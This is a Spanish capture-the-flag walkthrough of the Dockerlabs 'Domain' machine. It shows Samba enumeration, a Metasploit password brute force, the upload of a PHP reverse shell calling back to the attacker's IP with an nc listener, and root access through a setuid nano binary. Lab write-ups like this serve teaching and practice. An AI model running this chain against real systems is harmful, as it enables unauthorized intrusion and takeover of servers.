# Máquina Domain

Dificultad -> Media

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con dos archivos un .sh y un .tar.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpetas.

Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
```shell
sudo bash auto_deploy.sh domain.tar
```
--- 

Como siempre, empezamos escaneando la máquina objetivo:
```bash
nmap -sCV -p- --open -min.rate 5000 172.17.0.2 -vvv
```

 Encontramos 3 puertos abiertos con cierta info:
 <img width="1336" height="716" alt="imagen" src="https://github.com/user-attachments/assets/6ee3fa03-bf60-42bc-853a-61323ed337a1" />

Con lo que vemos vamos a empezar por enumerar todo aquello que podamos. En este caso miraremos la web y ambos recursos Samba SMB. 

 Mirando la web encontramos esto:
 
<img width="1906" height="538" alt="imagen" src="https://github.com/user-attachments/assets/e39efb8b-bf63-413f-95ab-ac03842a0e2d" />

 Basicamente nos está explicando Samba, por lo que vamos a enumerar todo sobre Samba.

 Lo primero en una enumeración Samba es probar a conectarse al servidor SMB sin credenciales:
 ```bash
smbclient -L //172.17.0.2 -N
```


Esto nos lista los recursos compartidos e intenta acceder a alguno sin credenciales. En este caso no conseguimos acceder a ninguno pero obtenemos ciertos recursos compartidos:
<img width="1816" height="348" alt="imagen" src="https://github.com/user-attachments/assets/88122b8e-9a38-4d2d-a949-c82afe90ee5d" />

En Samba a diferencia de SMB se usa `rcpclient`:
```bash
rpcclient -U "" -N 172.17.0.2
```
Con esto accedemos a una sesión.

Usamos sus comandos para obtener info:
```bash
enumdomusers
querydispinfo
enumdomgroups
queryuser 0x3e8
queryuser 0x3e9
```
Encontramos info relevante:
<img width="1235" height="259" alt="imagen" src="https://github.com/user-attachments/assets/652f65d3-c68e-43c4-8d8f-7a87f6aff4c4" />

Dos usuarios encontrados: james y bob.


Lo que no sabemos con `smbclient` son los permisos de los recursos compartidos. Para ello usaremos `smbmap` y `enum4linux`:
```bash
smbmap -H 172.17.0.2
enum4linux -a 172.17.0.2
```

Con enum4linux -a además de enumerar permisos de los recursos compartidos, podemos enumerar usuarios.

Con smbmap no encontramos nada relevante, nos indica que ninguno de los recurso tiene acceso. Pero con enum4linux encontramos la misma info de los usuarios de `rpcclient`.

Con SMB, SMBMap, rpcclient y enum4linux vimos que el objetivo 172.17.0.2 tiene Samba en el puerto 445 y permite conexiones anónimas. Encontramos tres recursos compartidos: html (la carpeta web /var/www/html), print$ e IPC$. El acceso anónimo a html y print$ está denegado, mientras que IPC$ es un recurso de comunicación y no una carpeta normal.

Además, conseguimos enumerar dos usuarios válidos: james y bob, ambos pertenecientes al grupo principal 0x201. La política de contraseñas es débil: mínimo 5 caracteres, sin requisitos de complejidad y sin límite de intentos. También confirmamos que el servidor es Samba sobre Linux/Ubuntu, que SMBv1 no está disponible y que el recurso html requiere autenticación. Por eso, el siguiente paso lógico es probar contraseñas para james y bob.

Probé hydra pero no soporta SMBv1. Por tanto vamos a usar Metasploit. Antes crear un users.txt con bob y james.
```bash
msfconsole
search smb_login
use 0
set RHOSTS 172.17.0.2
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
```

Encontramos una password para bob:

<img width="1545" height="170" alt="imagen" src="https://github.com/user-attachments/assets/34fd6bc9-c9ac-4e04-8691-e20835cfacab" />

Vamos a ver ahora los recursos de bob:
```bash
nxc smb 172.17.0.2 -u bob -p 'star' --shares
smbclient -L //172.17.0.2 -U 'bob'
```

<img width="1909" height="772" alt="imagen" src="https://github.com/user-attachments/assets/8f82221c-3c93-4c3e-99f3-4a3a5876dec5" />


Vemos algo muy interesante y es que tenemos acceso de lectura/escritura en el recurso web html. Vamos a acceder:
```bash
smbclient //172.17.0.2/hmtl -U 'bob'
```


<img width="1620" height="416" alt="imagen" src="https://github.com/user-attachments/assets/3af971d9-b7d4-429a-9820-913d9a8d467b" />

Nos encontramos solo el index.html que si lo revisamos es el archivo que mostraba la web. Por tanto tenemos acceso de escritura sobre el document root de la aplicación web. A partir de ahí ya tendría sentido investigar qué tecnología ejecuta la web y qué tipo de archivo podría aprovecharse.

Vamos a probar si se puede escribir. En mi caso subí el archivo `users.txt` que creamos antes. Si nos deja podemos ver el recurso en la web:

```bash
put users.txt
```

<img width="1150" height="196" alt="imagen" src="https://github.com/user-attachments/assets/6f960409-ffa4-4f64-90db-62f698411143" />

Vemos que funciona. Por tanto vamos a probar a subir una webshell que nos permita acceder al servidor. La web solo usa Apache HTTP y su server es Ubuntu según el nmap y Wappalyzer. Vamos a probar si ejecuta php:
```bash
echo '<?php echo "PHP_OK"; ?>' > test.php

# En SMB
put test.php

# Fuera de SMB
curl http://172.17.0.2/test.php
```
Nos devuelve PHP_OK, por tanto el server ejecuta PHP. Subimos una reverse shell PHP:
```bash
ip a # sacar nuestra ip
nano /usr/share/webshells/php/php-reverse-shell

# Cambiar
$ip = '172.17.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

```bash
# Escuchar 
nc -lnvp 1234
```

```bash
# Subir webshell
lcd /usr/share/webshells/php
put php-reverse-shell.php
```

```bash
# Ejecutar la reverse shell
 curl http://172.17.0.2/php-reverse-shell.php
```

Obtenemos una shell donde estaba el nc:

<img width="1346" height="235" alt="imagen" src="https://github.com/user-attachments/assets/94aabd44-64c5-4e88-80c2-7cfe760305b0" />

Somos www-data. Tenemos que escalar privilegios ahora:

**Escalada de privilegios**

Para escalar privilegios usaremos los comandos básicos antes de pasar a usar linpeas.
```bash
sudo -l
find / -perm -4000 -type f -user root 2>/dev/null
```

En el find de setuid encontramos un archivo interesante: nano

Vamos a buscar un binario explotable de esto en GTFOBins:

<img width="929" height="340" alt="imagen" src="https://github.com/user-attachments/assets/be428ee3-0bfa-4c68-a0c5-0e13eb6c4b9e" />

Usaremos esto para escalar privs. Antes de hacer nada, vamos a estabilizar la shell para que se trate de una terminal normal, ya que tras la reverse shell esta es muy limitada: https://github.com/DCh4con/Apuntes_eJPTv2/blob/main/Apuntes_eJPTv2/Tratamiento%20TTY.md

Para ello:
```bash
script /dev/null -c bash

# Pulsa Ctrl + Z (esto enviará tu sesión al segundo plano/background).
# En tu terminal de Kali, escribe el siguiente comando y pulsa Enter:
stty raw -echo; fg  # (Nota: No verás lo que escribes, o puede que se vea raro, es normal. Al pulsar Enter, volverás a la shell de la víctima).


reset xterm
export TERM=xterm
export SHELL=bash
```

Ahora para el binario:
```bash
nano -s '/bin/sh -p'

# Dentro
/bin/sh -p
# El ^ T no es para escribir, es para que se ejecute lo que hay en nano.
```

En una terminal normal:

^T = Ctrl + T

Por tanto dentro de nano hacer Ctl+T y:

<img width="701" height="120" alt="imagen" src="https://github.com/user-attachments/assets/96ed2be5-f417-4d3d-8228-d98846e1f17a" />

Ya somos root. Hemos alcanzado privilegios máximos en el sistema.

Máquina completada!
